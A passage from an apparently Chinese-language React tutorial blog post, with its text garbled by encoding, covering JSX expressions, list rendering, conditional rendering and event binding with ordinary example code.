ä¸­ç¼–å†™HTMLæ¨¡ç‰ˆç»“æ„ï¼Œå®ƒæ˜¯Reactä¸­æ„å»ºUIçš„æ–¹å¼ã€‚</p><p>ä¼˜åŠ¿ï¼šç»“åˆHTML+JS</p><ol><li>HTMLçš„å£°æ˜å¼æ¨¡ç‰ˆå†™æ³•</li><li>JavaScriptçš„å¯ç¼–ç¨‹èƒ½åŠ›</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> message <span class="token operator">=</span> <span class="token string">'this is message'</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is title</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>message<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-JSXçš„æœ¬è´¨"><a href="#3-2-JSXçš„æœ¬è´¨" class="headerlink" title="3.2 JSXçš„æœ¬è´¨"></a>3.2 JSXçš„æœ¬è´¨</h2><p>JSXå¹¶ä¸æ˜¯æ ‡å‡†çš„JSè¯­æ³•ï¼Œå®ƒæ˜¯ JSçš„è¯­æ³•æ‰©å±•ï¼Œæµè§ˆå™¨æœ¬èº«ä¸èƒ½è¯†åˆ«ï¼Œéœ€è¦é€šè¿‡è§£æå·¥å…·åšè§£æä¹‹åæ‰èƒ½åœ¨æµè§ˆå™¨ä¸­ä½¿ç”¨ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.18.43.png" style="zoom:50%;"><p>Babelåœ¨çº¿ç½‘ç«™ï¼Œåœ¨çº¿å°†JSXç¼–è¯‘æˆJSã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.19.06.png" style="zoom:50%;"><h2 id="3-3-JSXé«˜é¢‘åœºæ™¯-JSè¡¨è¾¾å¼"><a href="#3-3-JSXé«˜é¢‘åœºæ™¯-JSè¡¨è¾¾å¼" class="headerlink" title="3.3 JSXé«˜é¢‘åœºæ™¯-JSè¡¨è¾¾å¼"></a>3.3 JSXé«˜é¢‘åœºæ™¯-JSè¡¨è¾¾å¼</h2><p>åœ¨JSXä¸­å¯ä»¥é€šè¿‡ <code>å¤§æ‹¬å·è¯­æ³•{}</code> è¯†åˆ«JavaScriptä¸­çš„è¡¨è¾¾å¼ï¼Œæ¯”å¦‚å¸¸è§çš„å˜é‡ã€å‡½æ•°è°ƒç”¨ã€æ–¹æ³•è°ƒç”¨ç­‰ç­‰ã€‚</p><ol><li>ä½¿ç”¨å¼•å·ä¼ é€’å­—ç¬¦ä¸²</li><li>ä½¿ç”¨JSå˜é‡</li><li>å‡½æ•°è°ƒç”¨å’Œæ–¹æ³•è°ƒç”¨</li><li>ä½¿ç”¨JavaScriptå¯¹è±¡</li></ol><blockquote><p>æ³¨æ„ï¼šifè¯­å¥ã€switchè¯­å¥ã€å˜é‡å£°æ˜ä¸å±äºè¡¨è¾¾å¼ï¼Œä¸èƒ½å‡ºç°åœ¨{}ä¸­ã€‚</p></blockquote><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">//é¡¹ç›®çš„æ ¹ç»„ä»¶</span><span class="token keyword">function</span> <span class="token function">helloJsx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token string">"Hello Jsx!"</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> count<span class="token operator">=</span><span class="token number">99999</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.        </span><span class="token punctuation">{</span><span class="token comment">/* ä½¿ç”¨å¼•å·ä¼ é€’å­—ç¬¦ä¸² */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token string">'This is a String'</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* ä½¿ç”¨JSå˜é‡ */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/*å‡½æ•°è°ƒç”¨å’Œæ–¹æ³•è°ƒç”¨*/</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token function">helloJsx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* ä½¿ç”¨JavaScriptå¯¹è±¡ */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">color</span><span class="token operator">:</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token literal-property property">fontSize</span><span class="token operator">:</span><span class="token number">50</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">æˆ‘å˜çº¢ï¼Œå˜å¤§äº†å—ï¼Ÿ</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.35.34.png" alt="æˆªå±2024-12-10 15.35.34"></p><h2 id="3-4-JSXé«˜é¢‘åœºæ™¯-åˆ—è¡¨æ¸²æŸ“"><a href="#3-4-JSXé«˜é¢‘åœºæ™¯-åˆ—è¡¨æ¸²æŸ“" class="headerlink" title="3.4 JSXé«˜é¢‘åœºæ™¯-åˆ—è¡¨æ¸²æŸ“"></a>3.4 JSXé«˜é¢‘åœºæ™¯-åˆ—è¡¨æ¸²æŸ“</h2><p>åœ¨JSXä¸­å¯ä»¥ä½¿ç”¨åŸç”Ÿjsç§çš„<code>mapæ–¹æ³•</code> å®ç°åˆ—è¡¨æ¸²æŸ“ã€‚</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> list <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1001</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'Vue'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1002</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'React'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1003</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Angular'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* æ¸²æŸ“åˆ—è¡¨ */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* map å¾ªç¯å“ªä¸ªç»“æ„ returnç»“æ„*/</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* æ³¨æ„äº‹é¡¹ï¼šåŠ ä¸Šä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„key,å­—ç¬¦ä¸²æˆ–è€…number idt*/</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* keyçš„ä½œç”¨ï¼šReactæ¡†æ¶å†…éƒ¨ä½¿ç”¨ æå‡æ›´æ–°æ€§èƒ½çš„ */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span>list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token operator">=&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>jsä¸­çš„ç®­å¤´å‡½æ•°ï¼š</p><p>åœ¨JavaScriptä¸­ï¼Œç®­å¤´å‡½æ•°ï¼ˆArrow Functionï¼‰æ˜¯ES6ï¼ˆECMAScript 2015ï¼‰å¼•å…¥çš„ä¸€ç§æ–°çš„å‡½æ•°å†™æ³•ï¼Œå®ƒæä¾›äº†ä¸€ç§æ›´ç®€æ´çš„æ–¹å¼æ¥å†™å‡½æ•°ï¼Œç®­å¤´å‡½æ•°çš„è¯­æ³•æ¯”ä¼ ç»Ÿçš„å‡½æ•°è¡¨è¾¾å¼æ›´çŸ­ï¼Œè¿™äº›å‡½æ•°è¡¨è¾¾å¼æ›´é€‚ç”¨äºé‚£äº›å‡½æ•°ä½“è¾ƒçŸ­ä¸”ä¸éœ€è¦ä½¿ç”¨ <code>function</code> å…³é”®å­—çš„åœºæ™¯ã€‚</p><p>ç®­å¤´å‡½æ•°çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">param1<span class="token punctuation">,</span> param2<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">,</span> paramN</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  <span class="token comment">// å‡½æ•°ä½“</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå‡½æ•°ä½“åªæœ‰ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥çœç•¥èŠ±æ‹¬å·ï¼Œå¹¶ä¸”éšå¼è¿”å›è¯¥è¯­å¥çš„ç»“æœï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">param1<span class="token punctuation">,</span> param2<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">,</span> paramN</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå¯ä»¥çœç•¥å‚æ•°å‘¨å›´çš„æ‹¬å·ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token parameter">param</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ²¡æœ‰å‚æ•°çš„å‡½æ•°éœ€è¦ä½¿ç”¨ä¸€å¯¹ç©ºæ‹¬å·ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="3-5-æ¡ä»¶æ¸²æŸ“"><a href="#3-5-æ¡ä»¶æ¸²æŸ“" class="headerlink" title="3.5 æ¡ä»¶æ¸²æŸ“"></a>3.5 æ¡ä»¶æ¸²æŸ“</h2><h3 id="3-5-1-åŸºç¡€æ¡ä»¶æ¸²æŸ“"><a href="#3-5-1-åŸºç¡€æ¡ä»¶æ¸²æŸ“" class="headerlink" title="3.5.1 åŸºç¡€æ¡ä»¶æ¸²æŸ“"></a>3.5.1 åŸºç¡€æ¡ä»¶æ¸²æŸ“</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token keyword">const</span> loading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>flag <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span>loading <span class="token operator">?</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token operator">:</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>ä¸€ç§æ˜¾ç¤ºçš„æƒ…å†µï¼šç”¨&amp;&amp;è¿ç®—ç¬¦</p></li><li><p>ä¸¤ç§æ˜¾ç¤ºçš„æƒ…å†µï¼šä¸‰å…ƒè¿ç®—ç¬¦</p></li><li><p>ä¸‰ç§æ˜¾ç¤ºçš„æƒ…å†µï¼šif else</p></li></ul><h3 id="3-5-2-å¤æ‚æ¡ä»¶æ¸²æŸ“"><a href="#3-5-2-å¤æ‚æ¡ä»¶æ¸²æŸ“" class="headerlink" title="3.5.2 å¤æ‚æ¡ä»¶æ¸²æŸ“"></a>3.5.2 å¤æ‚æ¡ä»¶æ¸²æŸ“</h3><ul><li>éœ€æ±‚ï¼šåˆ—è¡¨ä¸­éœ€è¦æ ¹æ®æ–‡ç« çš„çŠ¶æ€é€‚é…</li><li>è§£å†³æ–¹æ¡ˆï¼šè‡ªå®šä¹‰å‡½æ•° + åˆ¤æ–­è¯­å¥</li></ul><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> articleType<span class="token operator">=</span><span class="token number">1</span> <span class="token comment">// 0æ— å›¾ 1å•å›¾ 2åŒå›¾</span><span class="token keyword">function</span> <span class="token function">getArticleTmpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">æ— å›¾æ¨¡å¼</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">å•å›¾æ¨¡å¼</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">åŒå›¾æ¨¡å¼</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">color</span><span class="token operator">:</span><span class="token string">"red"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">å‚æ•°é”™è¯¯ï¼</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token function">getArticleTmpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="å››ã€Reactä¸­çš„äº‹ä»¶ç»‘å®š"><a href="#å››ã€Reactä¸­çš„äº‹ä»¶ç»‘å®š" class="headerlink" title="å››ã€Reactä¸­çš„äº‹ä»¶ç»‘å®š"></a>å››ã€Reactä¸­çš„äº‹ä»¶ç»‘å®š</h1><h2 id="4-1-åŸºç¡€äº‹ä»¶ç»‘å®š"><a href="#4-1-åŸºç¡€äº‹ä»¶ç»‘å®š" class="headerlink" title="4.1  åŸºç¡€äº‹ä»¶ç»‘å®š"></a>4.1  åŸºç¡€äº‹ä»¶ç»‘å®š</h2><p>Reactä¸­çš„äº‹ä»¶ç»‘å®šï¼Œé€šè¿‡è¯­æ³• <code>on + äº‹ä»¶åç§° = { äº‹ä»¶å¤„ç†ç¨‹åº }</code>ï¼Œæ•´ä½“ä¸Šéµå¾ªé©¼å³°å‘½åæ³•ã€‚</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">btnClickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* åŸºç¡€äº‹ä»¶ç»‘å®š */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hr</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>btnClickHandler<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">ç‚¹æˆ‘</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text"> //ä¸ç”¨ä¼ å‚çš„æƒ…å†µ    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2016.39.47.png" style="zoom:50%;"><h2 id="4-2-ä½¿ç”¨äº‹ä»¶å‚æ•°"><a href="#4-2-ä½¿ç”¨äº‹ä»¶å‚æ•°" class="headerlink" title="4.2 ä½¿ç”¨äº‹ä»¶å‚æ•°"></a>4.2 ä½¿ç”¨äº‹ä»¶å‚æ•°</h2><p>åœ¨äº‹ä»¶å›è°ƒå‡½æ•°ä¸­è®¾ç½®å½¢å‚eå³å¯ã€‚</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'buttonæŒ‰é’®ç‚¹å‡»äº†'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>clickHandler<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>äº‹ä»¶å¯¹è±¡eï¼š</p><p><code>e</code> æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œå®ƒä»£è¡¨äº‹ä»¶å¯¹è±¡ï¼ˆEvent objectï¼‰ã€‚å½“ä½ åœ¨ React ç»„ä»¶ä¸­ä½¿ç”¨ <code>onClick</code> å±æ€§æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å°†ç”Ÿæˆçš„äº‹ä»¶å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’ç»™ç»‘å®šçš„äº‹ä»¶å¤„ç†å‡½æ•°ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œå½“ä½ ç‚¹å‡» <code>&lt;button&gt;</code> å…ƒç´ æ—¶ï¼Œä¼šè§¦å‘ä¸€ä¸ªç‚¹å‡»äº‹ä»¶ï¼ˆ<code>click</code> eventï¼‰ï¼Œæµè§ˆå™¨ä¼šåˆ›å»ºä¸€ä¸ªäº‹ä»¶å¯¹è±¡ <code>e</code>ï¼Œå…¶ä¸­åŒ…å«äº†å…³äºè¿™ä¸ªäº‹ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼š</p><ul><li><code>e.type</code>ï¼šäº‹ä»¶çš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯ <code>"click"</code>ã€‚</li><li><code>e.target</code>ï¼šè§¦å‘äº‹ä»¶çš„å…ƒç´ ï¼Œè¿™é‡Œæ˜¯ <code>&lt;button&gt;</code> å…ƒç´ ã€‚</li><li><code>e.currentTarget</code>ï¼šäº‹ä»¶ç»‘å®šçš„å…ƒç´ ï¼Œå¦‚æœäº‹ä»¶è¢«å†’æ³¡ï¼Œè¿™é‡Œå¯èƒ½ä¸ <code>e.target</code> ä¸åŒã€‚</li><li><code>e.preventDefault()</code>ï¼šä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºé˜»æ­¢äº‹ä»¶çš„é»˜è®¤è¡Œä¸ºã€‚</li><li><code>e.stopPropagation()</code>ï¼šä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºé˜»æ­¢äº‹ä»¶ç»§ç»­ä¼ æ’­åˆ°çˆ¶å…ƒç´ ã€‚</li><li><code>e.clientX</code> å’Œ <code>e.clientY</code>ï¼šé¼ æ ‡ç‚¹å‡»æ—¶çš„ä½ç½®åæ ‡ã€‚</li><li>ç­‰ç­‰ã€‚</li></ul></blockquote><h2 id="4-3-ä¼ é€’è‡ªå®šä¹‰å‚æ•°"><a href="#4-3-ä¼ é€’è‡ªå®šä¹‰å‚æ•°" class="headerlink" title="4.3 ä¼ é€’è‡ªå®šä¹‰å‚æ•°"></a>4.3 ä¼ é€’è‡ªå®šä¹‰å‚æ•°</h2><p>è¯­æ³•ï¼šäº‹ä»¶ç»‘å®šçš„ä½ç½®æ”¹é€ æˆç®­å¤´å‡½æ•°çš„å†™æ³•ï¼Œåœ¨æ‰§è¡ŒclickHandlerå®é™…å¤„ç†ä¸šåŠ¡å‡½æ•°çš„æ—¶å€™ä¼ é€’å®å‚ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2016.46.36.png" 